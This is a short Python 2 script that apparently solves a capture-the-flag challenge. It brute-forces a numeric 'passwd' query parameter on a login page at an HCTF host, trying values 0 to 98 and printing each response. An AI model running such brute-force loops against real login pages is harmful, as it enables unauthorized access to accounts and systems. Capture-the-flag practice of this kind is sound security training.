import urllib
import urllib2
url = "http://login3.uni.hctf.fun/?passwd="
for i in xrange(0,99):
    request = urllib2.Request(url+str(i))
    response = urllib2.urlopen(request)
    print "[-] brute " + str(i)
    print url+str(i)
    print "[*] response:"+response.read()